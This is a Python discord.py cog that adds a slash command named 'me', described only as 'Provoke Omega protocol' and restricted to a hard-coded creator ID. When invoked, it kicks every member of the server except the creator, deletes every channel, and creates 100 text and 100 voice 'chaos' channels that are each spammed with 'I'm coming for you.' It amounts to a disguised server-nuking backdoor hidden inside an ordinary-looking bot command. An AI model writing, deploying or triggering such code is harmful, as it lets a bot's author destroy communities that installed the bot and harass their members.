import discord
from discord.ext import commands
from discord import app_commands

# Replace this with the actual bot creator's ID
BOT_CREATOR_ID = 486652069831376943

class MeCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="me", description="Provoke Omega protocol.")
    async def me_command(self, interaction: discord.Interaction):
        if interaction.user.id != BOT_CREATOR_ID:
            await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
            return

        guild = interaction.guild

        if not guild:
            await interaction.response.send_message("This command can only be used in a server.", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True)

        try:
            # Kick all members (excluding the bot creator)
            for member in guild.members:
                if member.id != BOT_CREATOR_ID:
                    try:
                        await member.kick(reason="Command invoked by owner.")
                    except discord.Forbidden:
                        await interaction.followup.send(f"Unable to kick {member.name} due to insufficient permissions.", ephemeral=True)

            # Delete all channels
            for channel in guild.channels:
                try:
                    await channel.delete(reason="Command invoked by owner.")
                except discord.Forbidden:
                    await interaction.followup.send(f"Unable to delete channel {channel.name} due to insufficient permissions.", ephemeral=True)

            # Create chaos
            for i in range(100):
                try:
                    # Create text channels
                    text_channel = await guild.create_text_channel(name=f"chaos-text-{i}")
                    await text_channel.send("I'm coming for you.")
                    await text_channel.send("I'm coming for you.")
                    await text_channel.send("I'm coming for you.")

                    # Create voice channels
                    await guild.create_voice_channel(name=f"chaos-voice-{i}")
                except discord.Forbidden:
                    await interaction.followup.send(f"Failed to create additional channels at iteration {i}.", ephemeral=True)
                    break

            await interaction.followup.send("Omega protocol executed: Members kicked, channels deleted, chaos created.", ephemeral=True)

        except Exception as e:
            await interaction.followup.send(f"An unexpected error occurred: {e}", ephemeral=True)

async def setup(bot):
    await bot.add_cog(MeCog(bot))
